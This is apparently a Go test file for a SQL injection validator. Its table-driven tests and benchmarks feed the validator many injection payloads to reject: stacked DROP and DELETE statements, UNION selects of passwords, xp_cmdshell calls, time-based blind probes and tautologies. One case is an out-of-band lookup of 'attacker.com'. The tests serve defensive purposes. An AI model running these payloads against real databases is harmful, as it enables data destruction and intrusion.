package security

import (
	"testing"
)

func TestValidator_ValidateQuery(t *testing.T) {
	tests := []struct {
		name      string
		query     string
		strict    bool
		wantError bool
	}{
		// Legitimate queries (should pass)
		{
			name:      "simple_select",
			query:     "SELECT * FROM users WHERE id = ?",
			strict:    false,
			wantError: false,
		},
		{
			name:      "insert_with_multiple_values",
			query:     "INSERT INTO logs (level, message, timestamp) VALUES (?, ?, ?)",
			strict:    false,
			wantError: false,
		},
		{
			name:      "update_with_where",
			query:     "UPDATE users SET status = ? WHERE id = ?",
			strict:    false,
			wantError: false,
		},
		{
			name:      "join_query",
			query:     "SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id WHERE u.id = ?",
			strict:    false,
			wantError: false,
		},

		// SQL Comment Attacks
		{
			name:      "sql_comment_double_dash",
			query:     "SELECT * FROM users WHERE name = 'admin'-- AND password = 'x'",
			strict:    false,
			wantError: true,
		},
		{
			name:      "sql_comment_c_style",
			query:     "SELECT * FROM users WHERE id = 1 /*comment*/ OR 1=1",
			strict:    false,
			wantError: true,
		},
		{
			name:      "mysql_comment_hash",
			query:     "SELECT * FROM users WHERE id = 1# AND status = 0",
			strict:    false,
			wantError: true,
		},

		// Stacked Query Attacks
		{
			name:      "stacked_drop_table",
			query:     "SELECT * FROM users; DROP TABLE users",
			strict:    false,
			wantError: true,
		},
		{
			name:      "stacked_delete",
			query:     "SELECT * FROM users; DELETE FROM users WHERE 1=1",
			strict:    false,
			wantError: true,
		},
		{
			name:      "stacked_truncate",
			query:     "SELECT * FROM logs; TRUNCATE TABLE logs",
			strict:    false,
			wantError: true,
		},
		{
			name:      "stacked_alter",
			query:     "SELECT * FROM users; ALTER TABLE users ADD COLUMN hacked INT",
			strict:    false,
			wantError: true,
		},
		{
			name:      "stacked_create",
			query:     "SELECT * FROM users; CREATE TABLE backdoor (id INT)",
			strict:    false,
			wantError: true,
		},

		// UNION-Based Attacks
		{
			name:      "union_select",
			query:     "SELECT name FROM users WHERE id = 1 UNION SELECT password FROM admin",
			strict:    false,
			wantError: true,
		},
		{
			name:      "union_all_select",
			query:     "SELECT * FROM products UNION ALL SELECT * FROM credit_cards",
			strict:    false,
			wantError: true,
		},

		// Database-Specific Attacks
		{
			name:      "sqlserver_xp_cmdshell",
			query:     "SELECT * FROM users; EXEC xp_cmdshell('dir')",
			strict:    false,
			wantError: true,
		},
		{
			name:      "exec_function",
			query:     "SELECT * FROM users; exec('DROP TABLE users')",
			strict:    false,
			wantError: true,
		},
		{
			name:      "execute_function",
			query:     "SELECT * FROM users; execute('DELETE FROM logs')",
			strict:    false,
			wantError: true,
		},
		{
			name:      "sp_executesql",
			query:     "EXEC sp_executesql N'SELECT * FROM sensitive_data'",
			strict:    false,
			wantError: true,
		},

		// Information Schema Attacks (Data Exfiltration)
		{
			name:      "information_schema_query",
			query:     "SELECT table_name FROM information_schema.tables",
			strict:    false,
			wantError: true,
		},
		{
			name:      "postgres_sleep",
			query:     "SELECT * FROM users WHERE id = 1 AND pg_sleep(10) > 0",
			strict:    false,
			wantError: true,
		},
		{
			name:      "mysql_benchmark",
			query:     "SELECT * FROM users WHERE id = 1 AND benchmark(1000000, MD5('test'))",
			strict:    false,
			wantError: true,
		},
		{
			name:      "sqlserver_waitfor",
			query:     "SELECT * FROM users; waitfor delay '00:00:10'",
			strict:    false,
			wantError: true,
		},

		// Boolean-Based Blind Injection
		{
			name:      "or_1_equals_1",
			query:     "SELECT * FROM users WHERE username = 'admin' OR 1 = 1",
			strict:    false,
			wantError: true,
		},
		{
			name:      "or_quoted_1_equals_1",
			query:     "SELECT * FROM users WHERE username = 'x' OR '1' = '1'",
			strict:    false,
			wantError: true,
		},
		{
			name:      "and_1_equals_0",
			query:     "SELECT * FROM users WHERE id = 1 AND 1 = 0",
			strict:    false,
			wantError: true,
		},

		// Strict Mode Tests
		{
			name:      "legitimate_or_in_strict_mode",
			query:     "SELECT * FROM orders WHERE status = 'pending' OR status = 'processing'",
			strict:    true,
			wantError: true, // Blocked in strict mode
		},
		{
			name:      "legitimate_and_in_strict_mode",
			query:     "SELECT * FROM users WHERE active = 1 AND role = 'admin'",
			strict:    true,
			wantError: true, // Blocked in strict mode
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			validator := NewValidator(WithStrict(tt.strict))
			err := validator.ValidateQuery(tt.query)

			if tt.wantError && err == nil {
				t.Errorf("ValidateQuery() expected error but got none for query: %s", tt.query)
			}
			if !tt.wantError && err != nil {
				t.Errorf("ValidateQuery() unexpected error: %v for query: %s", err, tt.query)
			}
		})
	}
}

func TestValidator_ValidateParams(t *testing.T) {
	tests := []struct {
		name      string
		params    []interface{}
		wantError bool
	}{
		// Legitimate parameters
		{
			name:      "normal_string",
			params:    []interface{}{"john.doe", 123, "active"},
			wantError: false,
		},
		{
			name:      "email_address",
			params:    []interface{}{"user@example.com"},
			wantError: false,
		},
		{
			name:      "numeric_values",
			params:    []interface{}{42, 3.14, int64(100)},
			wantError: false,
		},

		// SQL Injection Attempts in Parameters
		{
			name:      "param_with_quote_and_comment",
			params:    []interface{}{"admin'--"},
			wantError: true,
		},
		{
			name:      "param_with_quote_and_semicolon",
			params:    []interface{}{"value'; DROP TABLE users--"},
			wantError: true,
		},
		{
			name:      "param_with_or_clause",
			params:    []interface{}{"' OR '1'='1"},
			wantError: true,
		},
		{
			name:      "param_with_and_clause",
			params:    []interface{}{"test' AND '1'='1"},
			wantError: true,
		},
		{
			name:      "param_with_union",
			params:    []interface{}{"id' UNION SELECT password FROM users--"},
			wantError: true,
		},
		{
			name:      "param_with_drop",
			params:    []interface{}{"'; DROP TABLE logs--"},
			wantError: true,
		},
		{
			name:      "param_with_c_comment",
			params:    []interface{}{"value /*comment*/"},
			wantError: true,
		},
		{
			name:      "param_with_xp_cmdshell",
			params:    []interface{}{"'; EXEC xp_cmdshell('dir')--"},
			wantError: true,
		},

		// Mixed parameters (some safe, some dangerous)
		{
			name:      "mixed_params_with_injection",
			params:    []interface{}{"safe_value", "admin'--", 123},
			wantError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			validator := NewValidator()
			err := validator.ValidateParams(tt.params)

			if tt.wantError && err == nil {
				t.Errorf("ValidateParams() expected error but got none for params: %v", tt.params)
			}
			if !tt.wantError && err != nil {
				t.Errorf("ValidateParams() unexpected error: %v for params: %v", err, tt.params)
			}
		})
	}
}

func TestValidator_OWASP_Top10_SQLi(t *testing.T) {
	// OWASP Top 10 SQL Injection attack vectors
	owaspAttacks := []struct {
		name  string
		query string
	}{
		{
			name:  "A03_2021_Injection_Classic",
			query: "SELECT * FROM users WHERE username = 'admin' OR '1'='1'",
		},
		{
			name:  "A03_2021_Injection_Tautology",
			query: "SELECT * FROM products WHERE id = 1 OR 1=1",
		},
		{
			name:  "A03_2021_Injection_Union",
			query: "SELECT name FROM users UNION SELECT password FROM admin",
		},
		{
			name:  "A03_2021_Injection_Stacked",
			query: "SELECT * FROM users; DROP TABLE users",
		},
		{
			name:  "A03_2021_Injection_Comment",
			query: "SELECT * FROM users WHERE id = 1-- AND status = 0",
		},
		{
			name:  "A03_2021_Injection_Blind_Time",
			query: "SELECT * FROM users WHERE id = 1 AND pg_sleep(5) > 0",
		},
		{
			name:  "A03_2021_Injection_Out_of_Band",
			query: "SELECT * FROM users; exec xp_cmdshell('nslookup attacker.com')",
		},
	}

	validator := NewValidator()

	for _, attack := range owaspAttacks {
		t.Run(attack.name, func(t *testing.T) {
			err := validator.ValidateQuery(attack.query)
			if err == nil {
				t.Errorf("OWASP attack not detected: %s - query: %s", attack.name, attack.query)
			}
		})
	}
}

// Benchmark validator performance
func BenchmarkValidator_ValidateQuery_Safe(b *testing.B) {
	validator := NewValidator()
	query := "SELECT * FROM users WHERE id = ? AND status = ?"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = validator.ValidateQuery(query)
	}
}

func BenchmarkValidator_ValidateQuery_Malicious(b *testing.B) {
	validator := NewValidator()
	query := "SELECT * FROM users WHERE id = 1 OR 1=1-- AND password = 'x'"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = validator.ValidateQuery(query)
	}
}

func BenchmarkValidator_ValidateParams_Safe(b *testing.B) {
	validator := NewValidator()
	params := []interface{}{"john.doe", 123, "active@example.com"}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = validator.ValidateParams(params)
	}
}

func BenchmarkValidator_ValidateParams_Malicious(b *testing.B) {
	validator := NewValidator()
	params := []interface{}{"admin'--", "'; DROP TABLE users--"}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = validator.ValidateParams(params)
	}
}
